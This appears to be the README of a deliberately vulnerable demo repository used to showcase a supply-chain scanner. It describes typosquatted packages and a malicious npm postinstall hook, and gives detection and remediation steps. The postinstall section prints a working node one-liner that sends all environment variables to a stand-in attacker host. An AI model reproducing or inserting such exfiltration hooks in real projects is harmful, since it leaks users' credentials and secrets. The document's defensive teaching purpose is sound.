# demo-victim-repo

**Educational demo — intentional supply chain vulnerabilities for LigmaFirewall showcase.**

This repo simulates a real AI service that has been compromised via two classes of supply chain attack:
the March 2024 `litellm-ai` typosquat campaign and the `axois` / postinstall exfiltration pattern.

---

## Embedded Vulnerabilities

### 1. PyPI Typosquatting — `litellm-ai` (mirrors the Mar 2024 attack)

`requirements.txt` pins `litellm-ai==1.0.3` instead of `litellm`.

The real `litellm-ai` package (published by the threat actor "BeeHive-AI") shipped a `_beacon()`
function in its `__init__.py` that ran on import and silently exfiltrated:
- `OPENAI_API_KEY`
- `ANTHROPIC_API_KEY`
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`
- `GITHUB_TOKEN`

`vendor/litellm_ai/__init__.py` in this repo shows the exact attack pattern with the C2 URL
neutralised to `127.0.0.1:19999` (nothing is actually sent).

### 2. npm Typosquatting — `axois` (mirrors the axios typosquat campaign)

`package.json` lists `axois` instead of `axios`. The transposed letters (`axois` ↔ `axios`)
are easy to miss in a code review. The malicious package proxies requests to the real axios API
while logging all HTTP traffic to an attacker server.

### 3. Malicious `postinstall` Script (mirrors event-stream / flatmap-stream 2018)

`package.json` has a `postinstall` script that runs during `npm install`:

```
node -e "const h=require('https');
         const d=Buffer.from(JSON.stringify(process.env)).toString('base64');
         h.get('https://exfil.attacker-c2.xyz/collect?host='+require('os').hostname()+'&data='+d,()=>{});"
```

This base64-encodes **all** environment variables (including injected CI secrets) and sends them
to an attacker-controlled server. The CI workflow at `.github/workflows/deploy.yml` injects
`OPENAI_API_KEY` and `ANTHROPIC_API_KEY` as env vars **before** `npm install` runs.

---

## Detection with LigmaFirewall

Run the supply chain scanner against this repo:

```python
from tools.supply_chain import check_supply_chain_risks
import json

result = json.loads(check_supply_chain_risks("demo_victim_repo"))
print(json.dumps(result, indent=2))
```

Expected output: **4 CRITICAL findings**

| # | Type | Package | Finding |
|---|------|---------|---------|
| 1 | TYPOSQUATTING | `axois` | 100% match to `axios` (known typosquat) |
| 2 | MALICIOUS_INSTALL_SCRIPT | `postinstall` | Outbound HTTPS + base64 env exfiltration |
| 3 | TYPOSQUATTING | `litellm-ai` | 100% match to `litellm` (known typosquat) |
| 4 | MALICIOUS_INIT_CODE | `litellm_ai` | `urllib.request.urlopen` fires on import |

---

## Fix (what LigmaFirewall tells you)

```bash
# Fix 1 — replace typosquatted Python package
pip uninstall litellm-ai
pip install litellm

# Fix 2 — replace typosquatted npm package
npm uninstall axois
npm install axios

# Fix 3 — remove malicious postinstall from package.json
# Delete the "postinstall" key from scripts in package.json

# Fix 4 — rotate all credentials immediately
# OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS keys, GITHUB_TOKEN
```
